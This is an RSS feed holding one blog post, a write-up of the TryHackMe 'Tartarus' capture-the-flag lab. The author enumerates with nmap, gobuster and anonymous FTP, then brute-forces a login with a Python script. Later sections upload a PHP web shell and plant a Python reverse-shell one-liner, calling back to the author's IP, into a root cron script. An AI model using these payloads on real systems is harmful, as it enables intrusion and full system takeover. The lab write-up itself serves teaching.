<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[hatecomputers.club]]></title><description><![CDATA[Blog primarily about infosec and some random thoughts.]]></description><link>https://gatsby-starter-blog-demo.netlify.app</link><generator>GatsbyJS</generator><lastBuildDate>Sun, 03 Jan 2021 23:00:10 GMT</lastBuildDate><item><title><![CDATA[TryHackMe - Tartarus CTF Writeup]]></title><description><![CDATA[This is my first TryHackMe writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado…]]></description><link>https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</link><guid isPermaLink="false">https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</guid><pubDate>Sun, 01 Nov 2020 22:12:03 GMT</pubDate><content:encoded>&lt;p&gt;This is my first &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt; writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado, lets get to it.   &lt;/p&gt;
&lt;h2&gt;Enumeration&lt;/h2&gt;
&lt;p&gt;I like to start it off by quickly checking whats in front of me. &lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt; can help with that. My &lt;em&gt;go-to&lt;/em&gt; approach is usually:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;P.S: Quick heads up: There will be command breakdown in the end of every article so you can use for future reference. For now, just bear with me.&lt;/em&gt;  &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nmap -Pn -sC -sV tartarus.htm | tee -a nmap-standard-ports

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 07:14 EDT
Nmap scan report for tartarus.thm (10.10.129.210)
Host is up (0.054s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.16.191
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, as you can see nmap has replied with 3 open ports being 21 (&lt;strong&gt;ftp&lt;/strong&gt;), 22 (&lt;strong&gt;ssh&lt;/strong&gt;) and 80 (&lt;strong&gt;http&lt;/strong&gt;). Also, because we took advantage of &lt;a href=&quot;&quot;&gt;nmap-scripts&lt;/a&gt;, we were able to get some additional juice, showing that FTP is allowing &lt;strong&gt;anonymous&lt;/strong&gt; login and also that is hosting a file called &lt;strong&gt;test.txt&lt;/strong&gt; which might be contain interesting information. &lt;/p&gt;
&lt;p&gt;In parallel while I poke around, I usually like having nmap doing a full scan on background:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nmap -Pn -p- tartarus.htm | tee -a nmap-all-ports&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The reason for doing this wasn’t so much about finding exploitable versions but basically to understand whether there was some hidden gems running on any custom ports I should’ve know of. That wasn’t the case. &lt;/p&gt;
&lt;h3&gt;FTP (21) - Part I&lt;/h3&gt;
&lt;p&gt;In the meantime, I logged myself on the FTP server and grabbed the &lt;strong&gt;test.txt&lt;/strong&gt; file. As you know by now, anonymous login was allowed:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Name (tartarus.thm:hatecomputers): anonymous
331 Please specify the password.
Password: &amp;lt;JUST-PRESS-ENTER&amp;gt;
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp&amp;gt; get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.00 secs (22.8357 kB/s)
ftp&amp;gt; exit
221 Goodbye.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;echoing its content gave me this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ cat test.txt
vsftpd test file&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which wasn’t necessarily useful. &lt;/p&gt;
&lt;h3&gt;Web (80) - Part I&lt;/h3&gt;
&lt;p&gt;I decided then to run &lt;code class=&quot;language-text&quot;&gt;curl&lt;/code&gt; against the host, looking for any possible leaks. Performing a simple &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; request gave me this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -s -i tartarus.thm

HTTP/1.1 200 OK
Date: Mon, 28 Sep 2020 13:02:09 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sun, 05 Jul 2020 21:31:26 GMT
ETag: &amp;quot;2c39-5a9b87b015a4a&amp;quot;
Accept-Ranges: bytes
Content-Length: 11321
Vary: Accept-Encoding
Content-Type: text/html


&amp;lt;!DOCTYPE html PUBLIC &amp;quot;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;quot; &amp;quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dt
d&amp;quot;&amp;gt;
&amp;lt;html xmlns=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;
  &amp;lt;!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19

    Output truncated...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You see Apache version was leaking (&lt;strong&gt;2.4.18&lt;/strong&gt;). Other than that, was just a simple default Apache server page.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/77ed571ba8802445b01dbfea226c2301/35252/apache.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 60.75949367088608%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsSAAALEgHS3X78AAACdklEQVQoz31R3U/TcBTdf2HwIwgoUWAmavDFJ331L/HV+KwoEBGRDyEbiAGV+GYwBl9NTAyMjTG2fq5r99Gu61bWdkAZBDQeb38YE3Ux6ck5ufd3T869DfWGb+BSz3V0doXR1X0VV/pvI3zzDnqu3cLFy/1o7+jF+c4w2jv7iPtwrr0Hp892o+1MN061XWD65E0fOsgjFHn5GpG5N5iOLGBschaR6Dyi9+5i6vkEhkYn8HDwKR48HsGj4WekRzAwNMpqg0/GMP5iFtPRV8RzmJldRHR+CaFcoQLDcqFXHOjEhzt7aLwdx7eaBc9pwNCKsE0LlVIZVcMkNmDpga4AP+g7+g7TOpkNPEIpToGYLYFXCBkF8vAS1u7PQBhYQHXqA+zpj7AjK6i/+4xadAXVyWVWt6aWYY6/Rz3yCVKMB6/qEOQiQhlBg6waDIJcQF5SkBezUDgBcoZHjpcgptLgtzKQ0xw0UYb6C8HbKiXX8ibEnM48fhtKgWG2iJJRQkkvQjeKKFfKxCViE/Z2DY5bR53geg68hse03/RR0C2Iyl+GATgpj69xDl/WtrCaFLHBqUgSxBz1KD1HKyXSCtY2JcRSMmKbMvU11mOhKOUfhjw1kqktJJIpxDc2sRpbx3piA7F4AvFEEmk6QYYXwQsSaQE8nWa77iFHK0v/rEwpRFpZ12nlEq1bLjMYhk41HbVqFa7jwHVdeJ7HtG3bOD4+glZsdcPAUCnCokFV01A2K2js7MLfb2K/eQDfb2LP32fY3fMZB71AZzW9RUL2Uwp0aBfVmo2clmdDzYNDMjxk3ArBG+V/htt1h9KZUFSVJTsxPGiJVoY/AfxtITuibTeaAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;apache&quot;
        title=&quot;apache&quot;
        src=&quot;/static/77ed571ba8802445b01dbfea226c2301/f058b/apache.png&quot;
        srcset=&quot;/static/77ed571ba8802445b01dbfea226c2301/c26ae/apache.png 158w,
/static/77ed571ba8802445b01dbfea226c2301/6bdcf/apache.png 315w,
/static/77ed571ba8802445b01dbfea226c2301/f058b/apache.png 630w,
/static/77ed571ba8802445b01dbfea226c2301/40601/apache.png 945w,
/static/77ed571ba8802445b01dbfea226c2301/35252/apache.png 1204w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Not very useful either, although default versions usually mean default configurations - and default passwords. Running &lt;code class=&quot;language-text&quot;&gt;Gobuster&lt;/code&gt; was next logical step:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;P.S: If you yet don’t have &lt;strong&gt;SecList&lt;/strong&gt; as part of your current workflow, make sure to grab it &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;here&lt;/a&gt;. Or if you doing from kali linux, you can do the same by apt -y install seclists. This should be available under &lt;strong&gt;/usr/share/&lt;/strong&gt; directory.&lt;/em&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ gobuster dir -u http://tartarus.thm -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tartarus.thm
[+] Threads:        20
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 09:14:08 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/09/28 09:16:08 Finished
===============================================================&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Also found “nothing”. &lt;strong&gt;/server-status&lt;/strong&gt; was available but forbidden. Worth pointing out I was starting to feel a little anxious already given this machine was flagged as easy but so far I hadn’t found anything. Shamelessly, I decided to run &lt;code class=&quot;language-text&quot;&gt;searchsploit&lt;/code&gt; expecting to shed some light and yet, nothing. Took a quick break expecting to have some insights. It worked.&lt;/p&gt;
&lt;p&gt;Turns out, I missed something quite obvious during my initial recon.&lt;/p&gt;
&lt;h3&gt;FTP (21) - Part II&lt;/h3&gt;
&lt;p&gt;I again log myself through FTP and this time took a better look around, this time not ignoring entries starting with &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt; when listing the files:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ftp&amp;gt; ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 .
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 .. 
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 ... 
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you are slightly comfortable with *nix environments, you know that &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt; means current directory, &lt;code class=&quot;language-text&quot;&gt;..&lt;/code&gt; means previous directory but &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt; isn’t really a thing. So, someone named a directory &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt; deliberately. Interesting. Let’s check what is inside: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ftp&amp;gt; cd ...
200 PORT command successful. Consider using PASV.
ftp&amp;gt; ls -al
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 yougotgoodeyes.txt
ftp&amp;gt; get yougotgoodeyes.txt
150 Here comes the directory listing.
226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So there was indeed, a different file and the content was just &lt;strong&gt;/sUp3r-s3cr3t&lt;/strong&gt;. Judging by the forward slash prefix, it stroke me as a potential web directory. I was right. Time to give the http server a go again.&lt;/p&gt;
&lt;h3&gt;Web (80) - Part II&lt;/h3&gt;
&lt;p&gt;Presented with a login page, I tried a few default username/password combinations just to make sure I wasn’t really missing anything. Gobuster was already running in background and found a directory called &lt;strong&gt;/images&lt;/strong&gt; (I’ve ran the same Gobuster as the one above but adding the /sUp3r-s3cr3t at the end of the url), which I couldn’t access.&lt;/p&gt;
&lt;p&gt;Also, while thinking about it, I previously assumed - &lt;strong&gt;n00b mistake&lt;/strong&gt; - that since it was a default Apache setup, everything was also default so I didn’t bother checking. I went back and found &lt;strong&gt;/robots.txt&lt;/strong&gt; was available, giving away a pretty important piece of information:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;User-Agent: *
Disallow: /admin-dir

I told d4rckh we should hide our things deep&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This led me to a open directory where I found two files: &lt;strong&gt;credentials.txt&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt;. Both files contained what appeared to be a list of passwords and usernames.&lt;/p&gt;
&lt;p&gt;After investing some time trying to sort it out &lt;code class=&quot;language-text&quot;&gt;Hydra&lt;/code&gt;’s terrible syntax that led me nowhere but frustration town, I decided to brute force my way in, scripting it myself. After manually poking with the login page to understand how it worked, I wrote this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/python3

import requests;                                                                                    
                                                                                                    
url = &amp;quot;http://tartarus.thm/sUp3r-s3cr3t/authenticate.php&amp;quot;                                           
                                                                                                    
with open(&amp;#39;userid&amp;#39;, &amp;#39;r&amp;#39;) as f:                                                                      
    usernames = [username.strip() for username in f.readlines() if username]                        
                                                                                                    
with open(&amp;#39;credentials.txt&amp;#39;, &amp;#39;r&amp;#39;) as f:                                                             
    passwords = [password.strip() for password in f.readlines() if password]
                                                  
print(&amp;#39;Brute forcing...&amp;#39;)          
for user in usernames:             
    response = requests.post(url, {                                                                 
        &amp;quot;username&amp;quot;: user,                                                                           
        &amp;quot;password&amp;quot;: &amp;#39;doesntmatter&amp;#39;                                                                  
    })                                                                                              
                                                                                                    
    if response.status_code == 200 and response.text == &amp;#39;Incorrect password!&amp;#39;:
        found_user = user                         
        print(f&amp;#39;username {user}&amp;#39;)                 
        break                                     
                                                  
for passwd in passwords:           
    response = requests.post(url, {
        &amp;quot;username&amp;quot;: found_user,
        &amp;quot;password&amp;quot;: passwd
    })

    if response.status_code == 200 and response.text != &amp;#39;Incorrect password!&amp;#39;:
        print(f&amp;#39;password {passwd}&amp;#39;)
        break&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The script is quite self explanatory. I basically replicated the same step-by-step I had previously executed manually to then, move that into actual piece of program that can repeat the tedious process of going through the both lists and validate all the possibilities. There might be better ways of doing so but I think being able to craft your own “exploits” as you go is a fine art. I suggest you to exercise that as much as you can.  &lt;/p&gt;
&lt;p&gt;Combining that woth both &lt;strong&gt;credentials&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt; wordlists, I managed to find the user and password necessary (&lt;strong&gt;enox:P@ssword1234&lt;/strong&gt;) so I could log in, which presented me with a “Upload your file” kind of page.&lt;/p&gt;
&lt;h3&gt;Getting a shell + user flag&lt;/h3&gt;
&lt;p&gt;I immediately created a simple php file with this and send it over: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
system($_GET[&amp;#39;cmd&amp;#39;])
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I could go for the &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentest monkey php reverse shell&lt;/a&gt; but I usually try to make things as simple as I can. This gives me everything I need: &lt;code class=&quot;language-text&quot;&gt;system&lt;/code&gt; function executes whenever command I would passed in, while the &lt;code class=&quot;language-text&quot;&gt;$_GET[&amp;#39;cmd&amp;#39;]&lt;/code&gt; is a  request param I’ve sent (which I named &lt;strong&gt;cmd&lt;/strong&gt;). &lt;/p&gt;
&lt;p&gt;Then I open up &lt;strong&gt;Burpsuite&lt;/strong&gt;, went to directory where my php script landed. &lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5181883912c3711b0cb6d2fecc8be241/11a8f/burp.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.78481012658227%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsSAAALEgHS3X78AAABsElEQVQ4y8VT2XLbMAzk//9Zk3ZyuY4zsT1OrIs6LInURR3cArSdxLHbpk/lzIoXsFhQgPj24wHfb2aYzRa4vZ/j6u4J949LzBcrh58Oy8NMZ08rBFGKKM4QHiCTHDLNkWQFxPx5g81rgEim8MPYXezy8gQZIS+UA+9LVaHUjBqF0ghCia0fEo8HEXkewiAiwoQcShjTO3TGoOsM2q6D6XskkYTaZW7dtt0e3X6u6wZlqfHy6kPcPSxwfX2L9WqNwAugSoWCVFSkQpGKqm4JDdYbD/w8HJgVyTiBrmqnVJFSXtdNC5FEOTbLF4TeFrHvI5USORmrLMOO0LYtNDnpqoK1FtM4YpoYk9tbOx1gMQwDhOfneF7t4G8lijiGUQoDpTuQw0jObMgpKVLMw+J8HM9G8hFN06FpjENPbzdSFI7EZDyzEk79jdCpOocjJB/xMabFZcMThfZc4zshKdw74oTgsyE/dvkvhH8zZEJO+/8T/u6xHeGXfsoHwkvjeNd8USFXhODPe5FejlxRFxTUQUenP5ZNmmbUh8p1xL6PzRm01tTnhet1LqFLNj31ONv9Au+7jUwrKIjsAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;burp&quot;
        title=&quot;burp&quot;
        src=&quot;/static/5181883912c3711b0cb6d2fecc8be241/f058b/burp.png&quot;
        srcset=&quot;/static/5181883912c3711b0cb6d2fecc8be241/c26ae/burp.png 158w,
/static/5181883912c3711b0cb6d2fecc8be241/6bdcf/burp.png 315w,
/static/5181883912c3711b0cb6d2fecc8be241/f058b/burp.png 630w,
/static/5181883912c3711b0cb6d2fecc8be241/40601/burp.png 945w,
/static/5181883912c3711b0cb6d2fecc8be241/78612/burp.png 1260w,
/static/5181883912c3711b0cb6d2fecc8be241/11a8f/burp.png 1272w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Then, back to the terminal and I typed: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4444&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And just waited. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4444
www-data@ubuntu-xenial:/var/www/html/sUp3r-s3cr3t/images/uploads$ ls                                
ls                                                                                                  
pogcat.png  shell.php
www-data@ubuntu-xenial:/var/www/html/sUp3r-s3cr3t/images/uploads$ cd /home &amp;amp;&amp;amp; ls
cleanup  d4rckh  thirtytwo
www-data@ubuntu-xenial:/home$ cd d4rckh
cd d4rckh                                         
www-data@ubuntu-xenial:/home/d4rckh$ ls -la                                          
total 16                                          
drwxr-xr-x 2 d4rckh d4rckh 4096 Jul  5 21:35 .
drwxr-xr-x 5 root   root   4096 Jul  5 21:45 ..
-rwxrwxrwx 1 root   root    129 Jul  5 21:45 cleanup.py
-rw-r--r-- 1 d4rckh d4rckh   33 Jul  5 21:45 user.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Feeling never gets old :‘) &lt;/p&gt;
&lt;p&gt;This was enough to get user flag as you can see. Next, we move to privilege escalation. &lt;/p&gt;
&lt;h3&gt;Privesc + root flag&lt;/h3&gt;
&lt;p&gt;If you paid close attention to what was shown above, you noticed that along with the &lt;strong&gt;user.txt&lt;/strong&gt;,
there’s a &lt;strong&gt;cleanup.py&lt;/strong&gt; script. You can tell it was originally created by the root but for whatever reason
we have all the permissions (read, write and execution). A quick &lt;code class=&quot;language-text&quot;&gt;cat&lt;/code&gt; to reveal its content:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh$ cat cleanup.py                                                 
#!/usr/bin/env python                                                                               
                                                                                                    
import os                                                                                           
import sys
                                                                                          
try:                                                                                                
        os.system(&amp;#39;rm -r /home/cleanup/* &amp;#39;)                                                         
except:                                                                                             
        sys.exit()                      &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It seems like its job (the kind of file that runs from time to time). I didn’t even check the cron jobs to see if there was something and just went with my gut. I then placed this piece of code on the top the script:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.9.84.24&amp;quot;,4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bi
n/sh&amp;quot;,&amp;quot;-i&amp;quot;]);   &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;and again, waited (this time listening to the port &lt;strong&gt;4445&lt;/strong&gt;). And after a minute or two(?):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4445
$ id                                
id=0(root) gid=0(root) groups=0(root)
$ ls 
root.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Game over. Put on &lt;a href=&quot;https://www.youtube.com/watch?v=r4b6XKk5-oo&quot;&gt;Privilege escalation&lt;/a&gt; on by Com Truise and go celebrate. I sure did. :)&lt;/p&gt;
&lt;p&gt;That’s it. Hope you’ve learnt something from this. See y’all next time.&lt;/p&gt;
&lt;h3&gt;Command breakdown&lt;/h3&gt;
&lt;h4&gt;Nmap&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Nmap is free security scanner, port scanner &amp;#x26; network exploration tool.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5&gt;First usage:&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-sC&lt;/strong&gt;: This options lets you take advantage of the vast scripts that are part of the the &lt;em&gt;nmap&lt;/em&gt; ecosystem. We will dive into that in a future tutorial.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-sV&lt;/strong&gt;: This allows me to know the different version which port is currently running. The absence of this, for instance, would just display that &lt;strong&gt;ftp&lt;/strong&gt; is running in the port 23 without telling you its &lt;strong&gt;vsftpd 3.0.3&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Second usage:&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-Pn&lt;/strong&gt;: Assumes that the host being scanned is up, skipping the verification.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-p-&lt;/strong&gt;: Scan all 65535 ports.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Tee&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Tee allows you to read something from the standard input and outputs it standard output.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-a&lt;/strong&gt;: With the addition of this option, it allows you to append the output to a file - nmap-report in this case - which can be used for later reference. &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Gobuster&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Gobuster is a tool used to brute-force URIs, DNS and Virtual Hosts.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dir&lt;/strong&gt;: Tells gobuster we are scanning directories.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-u&lt;/strong&gt;: Current hosted being scanned.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-w&lt;/strong&gt;: Wordlist path being used.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-t&lt;/strong&gt;: Number of threads we are using. &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;cURL&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;a HTTP client.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-s&lt;/strong&gt;: Silent mode or do not show progress while retrieving data.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-i&lt;/strong&gt;: Show headers as part of the response. &lt;/li&gt;
&lt;/ul&gt;</content:encoded></item></channel></rss>